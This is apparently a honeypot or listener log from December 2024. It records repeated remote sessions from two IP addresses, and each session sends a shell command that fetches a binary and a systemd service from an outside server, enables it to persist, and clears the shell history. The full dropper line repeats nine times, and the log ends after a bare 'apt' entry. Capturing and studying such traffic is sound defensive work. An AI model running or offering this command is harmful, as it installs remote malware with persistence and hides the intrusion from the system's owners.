--- Start of remote_exec_dallas_07-10_12_24.log ---
start
2024-12-07 13:03:59.409223 - ('45.148.10.46', 56312) - apt
2024-12-07 13:04:00.608542 - ('45.148.10.46', 56312) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 13:04:14.008796 - ('45.148.10.46', 47160) - apt
2024-12-07 13:04:16.115168 - ('45.148.10.46', 47160) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 13:04:28.219532 - ('45.148.10.46', 37560) - apt
2024-12-07 13:04:32.111074 - ('45.148.10.46', 37560) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 13:04:46.906616 - ('45.148.10.46', 60308) - apt
2024-12-07 13:04:49.306935 - ('45.148.10.46', 60308) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 13:05:02.554497 - ('45.148.10.46', 36682) - apt
2024-12-07 13:05:05.719848 - ('45.148.10.46', 36682) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 13:05:18.608165 - ('45.148.10.46', 53996) - apt
2024-12-07 13:05:22.206844 - ('45.148.10.46', 53996) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 13:05:36.109378 - ('45.148.10.46', 49336) - apt
2024-12-07 13:05:38.311173 - ('45.148.10.46', 49336) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 13:05:47.407067 - ('45.148.10.46', 45320) - apt
2024-12-07 13:05:51.011146 - ('45.148.10.46', 45320) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 14:09:00.426386 - ('45.148.10.203', 60416) - apt
2024-12-07 14:09:00.930806 - ('45.148.10.203', 60416) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-07 14:09:06.351347 - ('45.148.10.203', 39544) - apt
